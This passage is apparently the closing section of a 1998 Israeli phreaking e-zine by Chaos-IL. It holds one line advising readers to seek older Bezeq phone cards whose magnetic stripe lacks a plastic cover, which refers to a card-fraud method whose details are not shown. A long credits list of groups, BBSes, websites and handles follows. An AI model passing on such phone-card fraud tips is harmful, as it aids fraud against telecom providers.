+------
+Since Bezeq has learnt about that method, you should search for the older
+cards which don't have a plastic cover on that black stripe.
+                                      
+  OXiD
+
+
+
+
+09. Resources & Credits
+
+Chaos-IL would like to greet every possible resource who supported us or
+helped us in any kind of a way.
+
+Bezeq TeleCommunictions INC.
+Barak Israel-International INC.
+GreenShop Computers (TEL-AVIV)
+IDC Communications INC.
+AT&T Communications INC.
+SPRINT Global-One Communications
+Israel Telegraph LTD.
+
+2600 Magazine
+Phrack INC. Newsletter
+Informatik E-Magazine
+PLA-Phone Losers of America
+Hacker's Heaven (BBS)
+Underground Society (BBS)
+Route 66 (BBS)
+Liquid Underground (BBS)
+
+#hack
+#phreak
+#telephony
+#punx
+#root
+
+www.border.com
+www.etext.org
+www.l0pht.com
+www.lat.com
+www.liquid98.com
+www.itd.nrl.navy.mil
+ftp.fc.net
+
+The Prototype
+Captain Crunch
+Emmanuel Goldstein
+TS (Bezeq 144/199 Operator)
+CB (Bezeq 188 Operator)
+NI (Sprint Global One Operator)
+Retro
+Manomaker
+Unix geek
+Phriend
+The Milkman
+Anti-D
+Lizzard King
+Stoner
+Dr. Grass
+Dead Zed
+Blackbird
+Prophet
+Substance 
+Stoner
+F0k
+Mindroot
+Toast
+BelowZero
+*ALL of Chaos-IL Members
+
+-[EOI#2]----------------------------------------------------------------------
+
+(c) Chaos-IL Foundation
+        April 1998
